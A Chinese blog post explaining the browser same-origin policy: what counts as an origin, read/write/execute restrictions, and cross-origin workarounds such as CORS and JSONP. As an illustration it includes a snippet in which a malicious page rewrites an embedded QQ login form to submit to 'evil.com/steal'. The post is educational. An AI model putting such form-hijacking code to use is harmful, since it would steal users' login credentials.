title: 浏览器的同源策略
date: 2018.08.02
---

又是比较旧的知识点，网上也有很多类似的文章，看完之后大概率也能解决跨域的问题。但是实际下来，自己却不能很好地理解为什么需要同源策略，同源策略到底限制了什么。所以想写篇文章，好好做下总结。

首先，要知道同源指的是什么。

- 协议相同
- 域名相同
- 端口相同

满足上面三点才叫做同源。

然后来看下同源策略做了什么事情，[这篇文章](https://blogs.msdn.microsoft.com/ieinternals/2009/08/28/same-origin-policy-part-1-no-peeking/)用 Unix 下面的 [RWX](https://www.wikiwand.com/en/File_system_permissions#/Permissions) 去类比，我觉得非常好理解。

把同源策略比做 RWX 的话，那么一个源 A 就有下面这样的权限

- Read of resources from Origin B: Deny
- Write to Origin B: Limit
- Execute of resources from Origin B: Allow

可以看到`执行`这个权限是完全不受限制的，而`读取`的权限是完全没有，`写`的权限有一些。用几个具体的例子来看下`读取`和`执行`的区别。一个源 A 的页面

- MAY execute a script from B, but MUST not be permitted to get the raw sourcecode of that scrip
- MAY apply (execute) a CSS stylesheet from B, but MUST not be permitted to get the raw-text of that stylesheet
- MAY include (execute) a frame pointed at a HTML page from B, but MUST not be permitted to get the inner HTML of that frame
- MAY draw (execute) an image from B, but MUST not be permitted to examine the bits of that image
- MAY play (execute) a video from B, but MUST not be permitted to reconstruct the video by capturing images of it
- ......

因为上面的英文都很直接，所以就没有翻译成中文。`写`的操作包括

- 链接的跳转，比如从源 A 跳到源 B
- 源 A 向源 B 进行表单的提交
- 源 A 往源 B 的 DOM 写内容

上面的第一点和第二点是允许操作的，第三点则是禁止的。说完了这些限制，来看下如果去掉限制的话会怎样。

假设场景一，你在浏览器登陆了支付宝账户，然后没有退出。这时候在另外一个 tab 打开了一个恶意的网站，因为没有同源策略的限制，这个网站就可以直接调用支付宝的接口获取你的各种信息。

另外一个场景，你又是访问了一个恶意的网站

```html
<iframe id="qq" src="https://login.qq.com"></iframe>

<script>
    window.onload = function() {
        document.getElementById("qq").contentWindow.document.forms[0].action = "http://evil.com/steal";
    };
</script>
```

这个网站用 iframe 打开一个 qq 登陆的页面，然后直接把登录页面的表单提交地址改为自己服务器的地址。这样对方就能很轻松地获取到你的登陆信息。

虽然同源策略很有用，但是实际当中，我们也会有需要跨域操作的时候。这部分，就像开头说的，网上已经有很多文章说明，所以这里只是列举一下方法，包括

- CORS
- postMessage
- JSONP
- 反向代理

最后附上这篇文章的参考资料，排名区分先后 :-)

- <https://blogs.msdn.microsoft.com/ieinternals/2009/08/28/same-origin-policy-part-1-no-peeking/>
- <https://en.wikipedia.org/wiki/Same-origin_policy>
- <https://stackoverflow.com/questions/14667189/simple-example-for-why-same-origin-policy-is-needed>
- <https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>


(完)
